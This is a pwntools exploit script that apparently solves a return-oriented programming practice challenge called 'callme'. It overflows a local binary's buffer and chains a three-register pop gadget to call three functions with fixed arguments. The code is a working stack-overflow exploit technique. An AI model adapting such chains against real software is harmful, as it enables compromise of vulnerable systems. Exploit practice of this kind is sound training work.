from pwn import *

p = process('./callme')
e = ELF('./callme')
rop = ROP(e)

payload = b'A' * 40
pop_rdi_rsi_rdx_ret = rop.find_gadget(['pop rdi', 'pop rsi', 'pop rdx', 'ret']).address
payload += p64(pop_rdi_rsi_rdx_ret)
payload += p64(0xDEADBEEFDEADBEEF)
payload += p64(0xCAFEBABECAFEBABE)
payload += p64(0xD00DF00DD00DF00D)
payload += p64(e.symbols['callme_one'])

payload += p64(pop_rdi_rsi_rdx_ret)
payload += p64(0xDEADBEEFDEADBEEF)
payload += p64(0xCAFEBABECAFEBABE)
payload += p64(0xD00DF00DD00DF00D)
payload += p64(e.symbols['callme_two'])

payload += p64(pop_rdi_rsi_rdx_ret)
payload += p64(0xDEADBEEFDEADBEEF)
payload += p64(0xCAFEBABECAFEBABE)
payload += p64(0xD00DF00DD00DF00D)
payload += p64(e.symbols['callme_three'])

p.send(payload)
p.interactive()
